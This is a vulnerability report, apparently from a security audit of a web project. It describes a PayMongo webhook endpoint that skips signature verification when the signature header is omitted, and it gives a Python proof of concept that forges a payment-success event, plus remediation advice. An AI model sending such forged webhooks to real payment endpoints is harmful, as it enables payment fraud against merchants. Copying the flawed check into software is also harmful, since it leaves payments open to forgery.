# PayMongo Webhook Signature Authentication Bypass via Missing Header

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-09-23 01:54:37 UTC
**Target:** /workspace/run-as-one
**CWE:** CWE-287
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Low

## Description

The PayMongo webhook endpoint (`/api/webhooks/paymongo`) skips signature verification if the `paymongo-signature` header is omitted, allowing attackers to forge successful payment events and mark arbitrary registrations as PAID.

## Evidence

In `src/app/api/webhooks/paymongo/route.ts`, the signature check is wrapped in an `if` statement:

```typescript title=src/app/api/webhooks/paymongo/route.ts startLineNumber=14 endLineNumber=37
    if (webhookSecret && signatureHeader) {
      // Verify signature
      ...
        if (computedSignature !== signature) {
          console.error('PayMongo Webhook signature verification failed');
          return NextResponse.json({ error: 'Invalid signature' }, { status: 400 });
        }
      }
    }

    const body = JSON.parse(rawBody);
```

If an attacker simply does not include the `paymongo-signature` header in their POST request, `signatureHeader` evaluates to null. The condition `webhookSecret && signatureHeader` evaluates to false, causing the entire signature verification block to be skipped. The application then proceeds to parse the request body and process the fake payment event, updating the target registration status to `PAID`.

## Impact

An attacker can completely bypass payment for any registration by forging a webhook payload pointing to their `orderRef` or `checkoutSessionId`, granting them free access to events and resulting in direct financial loss for the organizers.

## Counterevidence

I checked if there is any middleware or other validation that enforces the presence of the `paymongo-signature` header. There is none. If the header is omitted, the `signatureHeader` variable is null, the `if (webhookSecret && signatureHeader)` block is completely bypassed, and the execution flows directly to processing the JSON payload and updating the database to `PAID`.

## What Would Change This Severity

If the application uses a different payment gateway in production that does not rely on this webhook, the impact would be reduced. However, this is the primary payment mechanism implemented.

## Technical Analysis

The vulnerability stems from flawed conditional logic during signature verification. The code intends to skip verification only if `PAYMONGO_WEBHOOK_SECRET` is not set (e.g., in a local development environment). However, the condition `if (webhookSecret && signatureHeader)` also skips verification if the `signatureHeader` is missing from the incoming request. Since an attacker controls the HTTP headers, they can simply omit `paymongo-signature`, bypass the HMAC validation entirely, and inject arbitrary JSON payloads representing successful payments.

## Proof of Concept

1. Create a pending registration and obtain its `orderRef` (e.g., `RM-1234567`).
2. Send a POST request to `/api/webhooks/paymongo` with the payload simulating a successful payment for that `orderRef`.
3. Do not include the `paymongo-signature` header in the request.
4. The server responds with `{"received": true}` and marks the registration as `PAID`.

```python
import urllib.request
import json

url = "https://<target>/api/webhooks/paymongo"
data = {
    "data": {
        "type": "checkout_session.payment.paid",
        "attributes": {
            "data": {
                "attributes": {
                    "reference_number": "RM-1234567"
                },
                "id": "cs_fake_session_id"
            }
        }
    }
}

req = urllib.request.Request(
    url, 
    data=json.dumps(data).encode('utf-8'), 
    headers={'Content-Type': 'application/json'}
)

try:
    resp = urllib.request.urlopen(req)
    print("Response:", resp.read().decode('utf-8'))
except Exception as e:
    print("Error:", e)
```

## Remediation

Ensure that if the `PAYMONGO_WEBHOOK_SECRET` is configured, the `paymongo-signature` header is strictly required. If the header is missing, the request should be rejected immediately.

## Fix Verification

I reviewed the code logic and confirmed that replacing the conditional block prevents the bypass. If the webhook secret is configured, the updated code strictly demands the signature header and its valid format, rejecting requests immediately with a 400 Bad Request if they are missing or malformed. Legitimate webhooks sent by PayMongo contain the header and will pass the verification.

## Assumptions

Assumes the server is configured with a PAYMONGO_WEBHOOK_SECRET, which is standard in production.
